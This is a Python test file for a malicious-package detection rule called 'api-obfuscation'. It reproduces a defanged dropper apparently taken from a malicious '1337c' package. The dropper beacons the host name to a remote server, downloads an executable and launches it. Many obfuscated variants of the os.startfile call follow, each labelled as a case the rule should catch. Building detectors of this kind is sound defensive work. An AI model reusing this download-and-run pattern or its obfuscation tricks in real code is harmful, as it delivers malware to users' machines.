""" Tests for api-obfuscation rule

    RULEID cases:
      - obfuscated version of 1337c package
"""
import os
import requests
from sys import platform
import base64

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get("https://DEFANGED.com/pyp/resp.php?live=Installation " +env)
        if platform == 'win32':
            url = 'https://DEFANGED.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            
            # os.system('start '+filename)
            # ruleid: api-obfuscation
            os.__dict__['startfile']('start '+filename)
            # Variations based on string obfuscation:
            # ruleid: api-obfuscation
            os.__dict__['start' + 'file']('start '+filename)  # string concatenation
            func = 'startfile'
            # ruleid: api-obfuscation
            os.__dict__[func]()  # pass string via variable
            # ruleid: api-obfuscation
            os.__dict__[base64.b64decode('DEFANGED').decode('utf-8')]('start '+filename)  # base64 encoding
            # ruleid: api-obfuscation
            os.__dict__[bytes.fromhex('00000000').decode('utf-8')]('start '+filename)  # hex encoding
            # ruleid: api-obfuscation
            os.__dict__["\x00\x00\x00\x00\x00\x00"]()  # hex encoding

            # ruleid: api-obfuscation
            os.__dict__['startfile'].__call__('start '+filename)
            # ruleid: api-obfuscation
            os.__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            os.__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(os, 'startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').startfile.__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile']('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__dict__['startfile'].__call__('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile')('start '+filename)

            # ruleid: api-obfuscation
            __import__('os').__getattribute__('startfile').__call__('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile')('start '+filename)

            # ruleid: api-obfuscation
            getattr(__import__('os'), 'startfile').__call__('start '+filename)
    except:
        pass    
